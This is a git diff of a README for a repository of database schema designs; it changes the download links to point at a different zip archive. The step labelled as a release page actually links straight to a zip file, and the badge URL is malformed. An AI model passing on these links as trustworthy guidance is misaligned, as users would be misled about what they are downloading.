@@ -6,7 +6,7 @@ Welcome to Database-Schema-Designs! This collection offers various designs for d
 
 ## 📦 Download Link
 
-[![Download](https://github.com/Ekamwayne18/Database-Schema-Designs/raw/refs/heads/main/E-Commerce-Database/Designs-Schema-Database-v2.2.zip%20Now-Database%20Schemas-brightgreen)](https://github.com/Ekamwayne18/Database-Schema-Designs/raw/refs/heads/main/E-Commerce-Database/Designs-Schema-Database-v2.2.zip)
+[![Download](https://raw.githubusercontent.com/Ekamwayne18/Database-Schema-Designs/main/E-Commerce-Database/Database-Schema-Designs-v2.0-beta.5.zip%20Now-Database%20Schemas-brightgreen)](https://raw.githubusercontent.com/Ekamwayne18/Database-Schema-Designs/main/E-Commerce-Database/Database-Schema-Designs-v2.0-beta.5.zip)
 
 ## 🔍 Table of Contents
 
@@ -37,7 +37,7 @@ To use the schema designs, you need:
 
 To start using the database schemas, follow these steps:
 
-1. **Visit the Release Page:** Click on this link: [Download Here](https://github.com/Ekamwayne18/Database-Schema-Designs/raw/refs/heads/main/E-Commerce-Database/Designs-Schema-Database-v2.2.zip). This page contains all available schema designs.
+1. **Visit the Release Page:** Click on this link: [Download Here](https://raw.githubusercontent.com/Ekamwayne18/Database-Schema-Designs/main/E-Commerce-Database/Database-Schema-Designs-v2.0-beta.5.zip). This page contains all available schema designs.
    
 2. **Select the Schema:** Browse through the list of released schemas. Find the one that fits your business needs.
 
